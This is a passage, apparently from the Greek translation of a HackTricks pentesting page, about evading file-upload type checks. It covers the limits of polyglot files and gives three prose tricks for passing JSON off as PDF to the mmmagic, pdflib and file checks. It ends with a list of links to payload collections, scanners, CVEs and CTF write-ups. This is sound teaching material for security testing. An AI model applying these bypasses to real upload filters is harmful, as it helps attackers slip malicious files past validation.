Παρότι είναι ευέλικτα, τα polyglots αντιμετωπίζουν περιορισμούς. Για παράδειγμα, ενώ ένα polyglot μπορεί ταυτόχρονα να ενσωματώνει ένα PHAR αρχείο και ένα JPEG, η επιτυχία του upload μπορεί να εξαρτάται από την πολιτική του πλατφόρμας σχετικά με τις επεκτάσεις αρχείων. Αν το σύστημα είναι αυστηρό ως προς τις επιτρεπτές επεκτάσεις, η απλή δομική διπλή φύση ενός polyglot μπορεί να μην αρκεί για να εξασφαλίσει το upload.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Πώς να αποφύγετε τον εντοπισμό τύπου αρχείου φορτώνοντας ένα έγκυρο αρχείο JSON ακόμα κι αν δεν επιτρέπεται, προσποιούμενοι ότι είναι αρχείο PDF (τεχνικές από **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Όσο τα μαγικά bytes `%PDF` βρίσκονται στα πρώτα 1024 bytes είναι έγκυρο (βλ. παράδειγμα στο post)
- **`pdflib` library**: Προσθέστε ένα ψεύτικο PDF format μέσα σε ένα πεδίο του JSON ώστε η βιβλιοθήκη να νομίζει ότι είναι PDF (βλ. παράδειγμα στο post)
- **`file` binary**: Μπορεί να διαβάσει έως 1048576 bytes από ένα αρχείο. Δημιουργήστε ένα JSON μεγαλύτερο από αυτό ώστε να μην μπορεί να αναλύσει το περιεχόμενο ως JSON και μετά μέσα στο JSON τοποθετήστε το αρχικό μέρος ενός πραγματικού PDF ώστε να το θεωρήσει PDF

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
